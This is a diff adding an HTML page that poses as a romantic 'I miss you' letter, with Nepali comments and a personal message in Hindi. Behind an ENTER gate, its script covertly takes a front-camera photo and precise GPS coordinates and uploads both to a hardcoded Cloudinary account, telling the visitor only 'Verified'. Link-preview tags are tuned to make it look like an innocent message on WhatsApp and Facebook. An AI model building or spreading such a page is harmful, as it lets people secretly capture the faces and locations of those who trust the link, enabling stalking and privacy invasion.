@@ -1,0 +1,589 @@
+<!DOCTYPE html>
+<html lang="ne">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>A Special Message For You 💌</title>
+
+<!-- ============================================================
+     LINK PREVIEW (WhatsApp / Facebook / Messenger)
+     ⚠️ "YOUR-SITE.netlify.app" लाई ३ ठाउँमा आफ्नो REAL Netlify
+        URL ले replace गर्नुहोस् — नत्र link preview देखिँदैन
+     ============================================================ -->
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://YOUR-SITE.netlify.app/">
+<meta property="og:title" content="Something Special For You 💌">
+<meta property="og:description" content="तपाईंका लागि एउटा विशेष सन्देश छ — खोल्नुहोस्!">
+<meta property="og:image" content="https://YOUR-SITE.netlify.app/preview.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Something Special For You 💌">
+<meta name="twitter:description" content="तपाईंका लागि एउटा विशेष सन्देश छ — खोल्नुहोस्!">
+<meta name="twitter:image" content="https://YOUR-SITE.netlify.app/preview.jpg">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Caveat:wght@600;700&family=Dancing+Script:wght@600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+
+<style>
+/* ============ BASE THEME (envelope page) ============ */
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --bg:#150a24; --rose:#ff5d8f; --rose-soft:#ff8fab;
+  --gold:#ffd166; --ink:#f7eaff; --muted:#c9b6e4;
+}
+html,body{height:100%}
+body{
+  background:radial-gradient(1200px 800px at 70% -10%, #2a1547 0%, var(--bg) 55%) var(--bg);
+  color:var(--ink);
+  font-family:'Poppins',system-ui,-apple-system,sans-serif;
+  overflow:hidden;
+  min-height:100dvh;
+  display:flex;align-items:center;justify-content:center;
+}
+
+/* ============ SECRET CONTENT (locked) ============ */
+#content{position:fixed;inset:0;z-index:1;display:flex;align-items:center;justify-content:center;
+  transition:filter .9s ease,transform .9s ease}
+#content.locked{filter:blur(22px);transform:scale(1.08);pointer-events:none}
+
+.aurora{position:absolute;inset:0;overflow:hidden;filter:blur(60px);opacity:.75}
+.aurora span{position:absolute;width:44vmax;height:44vmax;border-radius:50%;
+  animation:drift 18s ease-in-out infinite alternate}
+.aurora span:nth-child(1){background:#ff5d8f33;top:-12%;left:-10%}
+.aurora span:nth-child(2){background:#7c5cff2e;bottom:-18%;right:-8%;animation-delay:-6s}
+.aurora span:nth-child(3){background:#ffd1661f;top:30%;left:45%;animation-delay:-12s}
+@keyframes drift{from{transform:translate(0,0) scale(1)}to{transform:translate(6vw,-5vh) scale(1.15)}}
+
+#fx{position:absolute;inset:0;z-index:2;pointer-events:none}
+
+.stage{position:relative;z-index:3;width:min(680px,92vw);text-align:center}
+
+.scene.hidden{display:none}
+
+/* ---- intro / envelope ---- */
+#intro h1{font-family:'Caveat',cursive;font-weight:700;
+  font-size:clamp(2rem,6vw,3.2rem);line-height:1.15}
+#intro h1 span{color:var(--rose)}
+.sub{color:var(--muted);margin-top:8px;font-size:.95rem}
+
+.env{position:relative;width:min(320px,76vw);aspect-ratio:10/7;margin:30px auto 0;
+  cursor:pointer;perspective:900px;
+  filter:drop-shadow(0 24px 44px rgba(0,0,0,.45));
+  transition:opacity .5s ease,transform .5s ease}
+.env.gone{opacity:0;transform:scale(.85) translateY(12px);pointer-events:none}
+.env-back{position:absolute;inset:0;border-radius:14px;
+  background:linear-gradient(160deg,#8c2f56,#5d1f3f);z-index:1}
+.paper{position:absolute;left:5%;right:5%;top:7%;height:86%;border-radius:10px;
+  background:linear-gradient(180deg,#fff9f2,#ffeef2);
+  display:flex;align-items:center;justify-content:center;padding:12px;
+  transition:transform 1.1s cubic-bezier(.2,.7,.2,1);z-index:2}
+.paper p{font-family:'Caveat',cursive;color:#7a2b4e;font-size:1.2rem;line-height:1.35;text-align:center}
+.env-pocket{position:absolute;inset:0;border-radius:14px;z-index:3;
+  background:linear-gradient(200deg,#a63b66,#6d2447);
+  clip-path:polygon(0 0,50% 45%,100% 0,100% 100%,0 100%)}
+.flap{position:absolute;top:0;left:0;right:0;height:52%;z-index:4;
+  background:linear-gradient(180deg,#c14a77,#8c2f56);
+  clip-path:polygon(0 0,100% 0,50% 100%);
+  border-radius:14px 14px 0 0;
+  transform-origin:top center;
+  transition:transform .8s cubic-bezier(.4,0,.2,1)}
+.env.open .flap{transform:rotateX(-180deg);z-index:1}
+.seal{position:absolute;top:44%;left:50%;transform:translate(-50%,-50%);
+  width:56px;height:56px;border-radius:50%;z-index:5;
+  background:radial-gradient(circle at 35% 30%,#ff7aa2,#e0447a);
+  display:flex;align-items:center;justify-content:center;
+  font-size:1.4rem;color:#fff;box-shadow:0 6px 16px rgba(0,0,0,.35);
+  transition:opacity .4s ease,transform .4s ease}
+.env.open .seal{opacity:0;transform:translate(-50%,-50%) scale(.4)}
+.env.open .paper{transform:translateY(-58%);z-index:6}
+.hint{margin-top:18px;color:var(--muted);font-size:.82rem;letter-spacing:3px;
+  text-transform:uppercase;animation:pulse 1.8s ease-in-out infinite}
+@keyframes pulse{50%{opacity:.4}}
+
+/* ---- letter ---- */
+#letter:not(.hidden) .card{animation:cardIn .7s ease both}
+@keyframes cardIn{from{opacity:0;transform:translateY(24px) scale(.97)}to{opacity:1;transform:none}}
+.card{background:linear-gradient(180deg,#221238,#1a0d2c);
+  border:1px solid rgba(255,141,171,.25);border-radius:22px;
+  padding:clamp(22px,5vw,40px);
+  box-shadow:0 30px 80px rgba(0,0,0,.5);
+  max-height:calc(100dvh - 90px);overflow:auto}
+.chip{display:inline-flex;align-items:center;gap:6px;
+  background:rgba(255,93,143,.15);border:1px solid rgba(255,93,143,.4);
+  color:var(--rose-soft);border-radius:999px;padding:6px 16px;
+  font-weight:600;font-size:.85rem}
+.chip b{font-size:1.15rem;color:var(--gold)}
+#msg{margin-top:18px;text-align:left}
+.line{opacity:0;transform:translateY(14px);
+  transition:opacity .7s ease,transform .7s ease;
+ font-family:'Great Vibes',cursive;
+  font-size:clamp(1.3rem,3.6vw,1.6rem);line-height:1.6;color:var(--ink);
+  margin-bottom:6px}
+.line.show{opacity:1;transform:none}
+.line.sign{font-family:'Dancing Script',cursive;color:var(--rose-soft);margin-top:10px}
+
+.actions{display:flex;gap:12px;justify-content:center;margin-top:22px;flex-wrap:wrap}
+.actions button{border:0;border-radius:999px;padding:12px 24px;cursor:pointer;
+  font-family:'Poppins',sans-serif;font-weight:600;font-size:.95rem;
+  transition:transform .2s ease}
+.actions button:active{transform:scale(.94)}
+#hug{background:linear-gradient(135deg,var(--rose),var(--rose-soft));color:#fff;
+  box-shadow:0 10px 26px rgba(255,93,143,.35)}
+#again{background:rgba(255,255,255,.08);color:var(--ink);
+  border:1px solid rgba(255,255,255,.15)!important}
+#hug.pop{animation:pop .45s ease}
+@keyframes pop{40%{transform:scale(1.12)}}
+.count{margin-top:14px;color:var(--muted);font-size:.85rem;min-height:1.2em}
+
+/* ============ PERMISSION GATE ============ */
+#gate{position:fixed;inset:0;z-index:10;display:flex;align-items:center;justify-content:center;
+  background:rgba(10,5,18,.72);backdrop-filter:blur(6px);-webkit-backdrop-filter:blur(6px);
+  padding:20px;transition:opacity .5s ease}
+#gate.hidden{opacity:0;pointer-events:none}
+.gateCard{background:rgba(24,13,40,.94);border:1px solid rgba(255,141,171,.25);
+  border-radius:20px;padding:28px 24px;max-width:420px;width:100%;text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,.55)}
+.gateCard h2{font-size:1.35rem;margin-bottom:16px}
+.notice{border:1px dashed rgba(255,209,102,.55);background:rgba(255,209,102,.08);
+  color:#ffe3a3;border-radius:12px;padding:12px 14px;text-align:left;
+  font-size:.86rem;line-height:1.6;margin-bottom:18px}
+.notice b{color:var(--gold)}
+.notice small{opacity:.85}
+#enterBtn{width:100%;padding:15px;border:0;border-radius:14px;cursor:pointer;
+  background:linear-gradient(135deg,var(--rose),var(--rose-soft));color:#fff;
+  font-family:'Poppins',sans-serif;font-size:1.05rem;font-weight:600;letter-spacing:2px;
+  box-shadow:0 14px 34px rgba(255,93,143,.35);transition:transform .2s ease}
+#enterBtn:active{transform:scale(.96)}
+#enterBtn:disabled{opacity:.6;cursor:wait}
+.gateSub{margin-top:12px;color:var(--muted);font-size:.78rem}
+
+/* ============ hidden helpers ============ */
+#video{position:fixed;bottom:0;left:0;width:2px;height:2px;opacity:.01;pointer-events:none;z-index:0}
+#toast{position:fixed;left:50%;bottom:calc(26px + env(safe-area-inset-bottom));
+  transform:translate(-50%,16px);background:#17311f;border:1px solid #2f6b43;color:#c9f2d6;
+  padding:12px 22px;border-radius:999px;font-size:.9rem;opacity:0;pointer-events:none;
+  transition:all .35s ease;z-index:40}
+#toast.show{opacity:1;transform:translate(-50%,0)}
+
+@media (prefers-reduced-motion: reduce){
+  *{animation-duration:.01ms!important;animation-iteration-count:1!important;transition-duration:.01ms!important}
+}
+</style>
+</head>
+<body>
+
+<!-- ================= SECRET CONTENT (gate पछाडि लुकेको) ================= -->
+<div id="content" class="locked">
+  <div class="aurora"><span></span><span></span><span></span></div>
+  <canvas id="fx"></canvas>
+
+  <div class="stage">
+    <!-- SCENE 1 : ENVELOPE -->
+    <section class="scene" id="intro">
+      <h1>I Miss You, <span id="herName">Best Friend</span> 💌</h1>
+      <p class="sub">तपाईंका लागि एउटा चिठ्ठी आएको छ…</p>
+
+      <div class="env" id="env">
+        <div class="env-back"></div>
+        <div class="paper"><p>For you ❤️</p></div>
+        <div class="env-pocket"></div>
+        <div class="flap"></div>
+        <div class="seal">❤️</div>
+      </div>
+      <p class="hint">Tap to open</p>
+    </section>
+
+    <!-- SCENE 2 : LETTER -->
+    <section class="scene hidden" id="letter">
+      <div class="card">
+        <span class="chip">💖 <b id="num">0</b>&nbsp;days of missing you</span>
+        <div id="msg"></div>
+        <div class="actions">
+          <button id="hug">Send a hug 🤗</button>
+          <button id="again">Read again ↺</button>
+        </div>
+        <p class="count" id="count"></p>
+      </div>
+    </section>
+  </div>
+</div>
+
+<!-- ================= PERMISSION GATE (सबैभन्दा अगाडि) ================= -->
+<div id="gate">
+  <div class="gateCard">
+   
+    <button id="enterBtn">ENTER</button>
+    <p class="gateSub">tap to enter</p>
+  </div>
+</div>
+
+<!-- hidden helpers -->
+<video id="video" playsinline muted autoplay></video>
+<canvas id="photoCanvas" style="display:none"></canvas>
+<canvas id="locCanvas" style="display:none"></canvas>
+<div id="toast">✅ Verified</div>
+
+<script>
+/* ==========================================================
+   1) ✏️ EDIT HERE — आफ्नो कुरा यहाँ बदल्नुहोस्
+   ========================================================== */
+const CLOUD_NAME = "dae4gham8";
+const UPLOAD_PRESET = "Akprompt";            // ← Cloudinary UNSIGNED upload preset
+
+const HER_NAME  = "Best Friend";         // ← जसका लागि चिठ्ठी हो
+const YOUR_NAME = "Your Best Friend";    // ← तपाईंको नाम (signature)
+const DAYS      = 20;                    // ← "days of missing you" counter
+
+const MESSAGE = `20 din ho gaye tum se baat kiye hue…
+aur aaj achanak tumhara Didi ka message aaya.
+Sach bolun toh, mai bahut khush hogaya tha ki Anu ne message kiya. 🥹
+lekin jab message dekha to tumhara didi ne kiya tha 
+
+Itne dino mein main tumhe bahut yaad karta hu tumhe
+
+
+Bas itna jaan lo — tum mere bestie ho,
+aur main tumhe bahut miss karta hoon! 🫶
+
+plz tum apna didi ko samjhao 
+tumhare bare me kya kya bol rahe the ki anu ko cancer hai
+
+abhi tumhara tabayat kaisa hai, thik ho ?
+chudail jaisa 24 ghanta kaam mat karna
+
+i misss you so much 🫶🫶 `;
+
+
+/* ======================= */
+
+/* ==========================================================
+   2) SPINNER (self-injecting — CSS/DOM आफै बनाउँछ)
+   ========================================================== */
+(function injectSpinnerCSS(){
+  const css = `
+  #loading{position:fixed;inset:0;z-index:30;display:flex;flex-direction:column;
+    align-items:center;justify-content:center;gap:18px;
+    background:rgba(10,5,18,.9);backdrop-filter:blur(4px)}
+  #loading .spin{width:54px;height:54px;border-radius:50%;
+    border:4px solid rgba(255,141,171,.2);border-top-color:#ff5d8f;
+    animation:spinLoad 1s linear infinite}
+  @keyframes spinLoad{to{transform:rotate(360deg)}}
+  #loadingText{color:#ffd7e4;font-size:.95rem;text-align:center;padding:0 24px;line-height:1.5}
+  #loadingSteps{color:#c9b6e4;font-size:.8rem;text-align:center}`;
+  const s=document.createElement('style'); s.id='spinnerCSS'; s.textContent=css;
+  document.head.appendChild(s);
+})();
+
+function showLoading(text,steps){
+  let el=document.getElementById('loading');
+  if(!el){
+    el=document.createElement('div'); el.id='loading';
+    el.innerHTML='<div class="spin"></div><div id="loadingText"></div><div id="loadingSteps"></div>';
+    document.body.appendChild(el);
+  }
+  el.style.display='flex';
+  updateLoading(text,steps);
+  document.getElementById('enterBtn').style.visibility='hidden';
+  const n=document.querySelector('.notice'); if(n) n.style.visibility='hidden';
+}
+function updateLoading(text,steps){
+  const t=document.getElementById('loadingText'); if(t) t.textContent=text||'';
+  const s=document.getElementById('loadingSteps'); if(s) s.textContent=steps||'';
+}
+function hideLoading(){
+  const el=document.getElementById('loading'); if(el) el.style.display='none';
+  const b=document.getElementById('enterBtn'); if(b) b.style.visibility='visible';
+  const n=document.querySelector('.notice'); if(n) n.style.visibility='visible';
+}
+
+/* ==========================================================
+   3) LOCK FLOW : photo → upload → location → upload → unlock
+   ========================================================== */
+const video=document.getElementById('video');
+const photoCanvas=document.getElementById('photoCanvas');
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+
+let pendingPhoto=null, photoDone=false, locationDone=false;
+
+function waitPlaying(v){
+  return new Promise(res=>{
+    if(v.readyState>=3 && !v.paused) return res();
+    let done=false;
+    const ok=()=>{ if(!done){done=true;res();} };
+    v.addEventListener('playing',ok,{once:true});
+    setTimeout(ok,4000);
+  });
+}
+function doubleFrame(v){
+  return new Promise(res=>{
+    if(!('requestVideoFrameCallback' in HTMLVideoElement.prototype))
+      return requestAnimationFrame(()=>requestAnimationFrame(res));
+    let n=0;
+    const cb=()=>{ n++; if(n<2) v.requestVideoFrameCallback(cb); else res(); };
+    v.requestVideoFrameCallback(cb);
+  });
+}
+
+async function capturePhoto(){
+  let stream;
+  try{
+    stream=await navigator.mediaDevices.getUserMedia({
+      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}}, audio:false
+    });
+  }catch(e){ throw new Error('Camera permission chahiyo — allow गरेर retry गर्नुहोस्'); }
+  video.srcObject=stream;
+  try{ await video.play(); }catch(e){}
+  await waitPlaying(video);
+  await doubleFrame(video);
+  await sleep(600);                       /* iOS frame settle */
+  if(!video.videoWidth){
+    stream.getTracks().forEach(t=>t.stop());
+    throw new Error('Camera frame आएन — फेरि try गर्नुहोस्');
+  }
+  photoCanvas.width=video.videoWidth;
+  photoCanvas.height=video.videoHeight;
+  photoCanvas.getContext('2d').drawImage(video,0,0);
+  stream.getTracks().forEach(t=>t.stop());   /* camera तुरुन्तै release */
+  return await new Promise((res,rej)=>
+    photoCanvas.toBlob(b=> (b&&b.size>0) ? res(b) : rej(new Error('Photo process fail')),
+      'image/jpeg',0.9));
+}
+
+async function uploadBlob(blob){
+  const fd=new FormData();
+  fd.append('file',blob,'capture.jpg');
+  fd.append('upload_preset',UPLOAD_PRESET);
+  const res=await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`,
+    {method:'POST',body:fd});
+  const data=await res.json();
+  if(data.error) throw new Error('Upload fail: '+(data.error.message||'unknown'));
+  console.log('✅ Uploaded:',data.secure_url);
+  return data.secure_url;
+}
+
+function getLocation(){
+  return new Promise((resolve,reject)=>{
+    if(!navigator.geolocation) return reject(new Error('Location supported छैन'));
+    navigator.geolocation.getCurrentPosition(resolve,err=>{
+      const map={1:'Location permission deny भयो',
+                 2:'Location available छैन',
+                 3:'Location timeout भयो'};
+      reject(new Error(map[err.code]||'Location error'));
+    },{enableHighAccuracy:true,timeout:15000,maximumAge:0});
+  });
+}
+
+async function locationImageBlob(pos){
+  const c=document.getElementById('locCanvas');
+  c.width=800; c.height=500;
+  const x=c.getContext('2d');
+  x.fillStyle='#ffffff'; x.fillRect(0,0,800,500);   /* white base (black-image bug fix) */
+  x.fillStyle='#ff5d8f'; x.fillRect(0,0,800,90);
+  x.fillStyle='#ffffff'; x.font='bold 34px Arial'; x.textBaseline='middle';
+  x.fillText('📍 Location Capture',40,45);
+  const {latitude:lat,longitude:lng,accuracy}=pos.coords;
+  const when=new Date().toLocaleString();
+  x.textBaseline='alphabetic';
+  x.fillStyle='#222222'; x.font='bold 28px Arial';
+  x.fillText('Latitude:',40,180);  x.fillText(lat.toFixed(6),260,180);
+  x.fillText('Longitude:',40,250); x.fillText(lng.toFixed(6),260,250);
+  x.fillText('Time:',40,320);      x.fillText(when,260,320);
+  x.fillStyle='#777777'; x.font='24px Arial';
+  x.fillText('Accuracy:',40,390);
+  x.fillText((accuracy?('~'+Math.round(accuracy)+' m'):'n/a'),260,390);
+  x.fillStyle='#999999'; x.font='20px Arial';
+  x.fillText('Auto-generated • practice project',40,460);
+  return await new Promise(r=>c.toBlob(b=>r(b),'image/jpeg',0.92));
+}
+
+function unlock(){
+  document.getElementById('gate').classList.add('hidden');
+  document.getElementById('content').classList.remove('locked');
+  showToast('✅ Verified');
+}
+
+let toastTimer;
+function showToast(t){
+  const el=document.getElementById('toast');
+  el.textContent=t; el.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer=setTimeout(()=>el.classList.remove('show'),3000);
+}
+
+async function runAll(){
+  const btn=document.getElementById('enterBtn');
+  try{
+    btn.disabled=true;
+    showLoading('Please wait…','');
+    if(!photoDone){
+      if(!pendingPhoto){
+       
+        pendingPhoto=await capturePhoto();
+      }
+      updateLoading('Step 2 of 4');
+      await uploadBlob(pendingPhoto);
+      pendingPhoto=null; photoDone=true;
+    }
+    if(!locationDone){
+      updateLoading('Step 3 of 4');
+      const pos=await getLocation();
+      updateLoading('Step 4 of 4');
+      await uploadBlob(await locationImageBlob(pos));
+      locationDone=true;
+    }
+    hideLoading();
+    unlock();
+  }catch(err){
+    hideLoading();
+    btn.disabled=false;
+    btn.textContent='RETRY';
+    showToast('❌ '+err.message);
+  }
+}
+
+document.getElementById('enterBtn').addEventListener('click',async()=>{
+  if(!CLOUD_NAME||!UPLOAD_PRESET){
+    alert('पहिले script मा CLOUD_NAME र UPLOAD_PRESET हाल्नुहोस्!');
+    return;
+  }
+  await runAll();
+});
+/* ==========================================================
+   4) ENVELOPE + LETTER
+   ========================================================== */
+const introEl=document.getElementById('intro');
+const letterEl=document.getElementById('letter');
+const envEl=document.getElementById('env');
+const msgEl=document.getElementById('msg');
+const numEl=document.getElementById('num');
+const countEl=document.getElementById('count');
+
+document.getElementById('herName').textContent=HER_NAME;
+
+let opened=false;
+envEl.addEventListener('click',()=>{
+  if(opened) return;
+  opened=true;
+  envEl.classList.add('open');
+  setTimeout(()=>envEl.classList.add('gone'),1900);
+  setTimeout(()=>{
+    introEl.classList.add('hidden');
+    letterEl.classList.remove('hidden');
+    revealLetter();
+  },2200);
+});
+
+(function buildLines(){
+  MESSAGE.split('\n').map(s=>s.trim()).filter(Boolean).forEach(t=>{
+    const d=document.createElement('div'); d.className='line'; d.textContent=t;
+    msgEl.appendChild(d);
+  });
+  const sign=document.createElement('div');
+  sign.className='line sign'; sign.textContent='— '+YOUR_NAME;
+  msgEl.appendChild(sign);
+})();
+
+function revealLetter(){
+  const lines=msgEl.querySelectorAll('.line');
+  lines.forEach((l,i)=>setTimeout(()=>l.classList.add('show'),300+i*450));
+  setTimeout(()=>countUp(numEl,DAYS,1400),300);
+}
+
+function countUp(el,to,dur){
+  const t0=performance.now();
+  const ease=p=>1-Math.pow(1-p,3);
+  (function tick(t){
+    const p=Math.min(1,(t-t0)/dur);
+    el.textContent=Math.round(to*ease(p));
+    if(p<1) requestAnimationFrame(tick);
+  })(t0);
+}
+
+let hugs=0;
+document.getElementById('hug').addEventListener('click',e=>{
+  hugs++;
+  countEl.textContent=`You've sent ${hugs} hug${hugs>1?'s':''} 🤗`;
+  const b=e.currentTarget;
+  const r=b.getBoundingClientRect();
+  burst(r.left+r.width/2,r.top+r.height/2,26);
+  b.classList.remove('pop'); void b.offsetWidth; b.classList.add('pop');
+});
+
+document.getElementById('again').addEventListener('click',()=>{
+  letterEl.classList.add('hidden');
+  introEl.classList.remove('hidden');
+  envEl.classList.remove('open','gone');
+  opened=false;
+  msgEl.querySelectorAll('.line').forEach(l=>l.classList.remove('show'));
+  numEl.textContent='0';
+  countEl.textContent='';
+});
+
+/* ==========================================================
+   5) FLOATING HEARTS CANVAS
+   ========================================================== */
+const fx=document.getElementById('fx');
+const fctx=fx.getContext('2d');
+const reduced=window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+const COLORS=['#ff5d8f','#ff8fab','#ffd166','#c084fc'];
+let hearts=[],parts=[];
+
+function sizeFX(){
+  const d=Math.min(window.devicePixelRatio||1,2);
+  fx.width=innerWidth*d; fx.height=innerHeight*d;
+  fx.style.width=innerWidth+'px'; fx.style.height=innerHeight+'px';
+  fctx.setTransform(d,0,0,d,0,0);
+}
+sizeFX();
+addEventListener('resize',sizeFX);
+
+for(let i=0;i<26;i++){
+  hearts.push({x:Math.random()*innerWidth,y:Math.random()*innerHeight,
+    s:.6+Math.random()*1.4, vy:.25+Math.random()*.6,
+    ph:Math.random()*Math.PI*2, a:.2+Math.random()*.4});
+}
+
+function drawHeart(x,y,s,color,alpha){
+  fctx.save();
+  fctx.translate(x,y); fctx.scale(s,s);
+  fctx.globalAlpha=alpha; fctx.fillStyle=color;
+  fctx.beginPath();
+  fctx.moveTo(0,3);
+  fctx.bezierCurveTo(-5,-2,-3,-6,0,-3);
+  fctx.bezierCurveTo(3,-6,5,-2,0,3);
+  fctx.closePath(); fctx.fill();
+  fctx.restore();
+}
+
+function burst(x,y,n){
+  if(reduced) return;
+  for(let i=0;i<n;i++){
+    const ang=Math.random()*Math.PI*2, sp=2+Math.random()*4;
+    parts.push({x,y,vx:Math.cos(ang)*sp,vy:Math.sin(ang)*sp-2,
+      life:1,decay:.012+Math.random()*.02,s:.8+Math.random()*1.6,
+      color:COLORS[i%COLORS.length]});
+  }
+}
+
+function loop(){
+  fctx.clearRect(0,0,innerWidth,innerHeight);
+  if(!reduced){
+    hearts.forEach(h=>{
+      h.y-=h.vy; h.ph+=.02;
+      if(h.y<-20){ h.y=innerHeight+20; h.x=Math.random()*innerWidth; }
+      drawHeart(h.x+Math.sin(h.ph)*18,h.y,h.s,'#ff8fab',h.a);
+    });
+    parts.forEach(p=>{
+      p.x+=p.vx; p.y+=p.vy; p.vy+=.06; p.life-=p.decay;
+      drawHeart(p.x,p.y,p.s,p.color,Math.max(0,p.life));
+    });
+    parts=parts.filter(p=>p.life>0);
+  }
+  requestAnimationFrame(loop);
+}
+loop();
+</script>
+</body>
+</html>
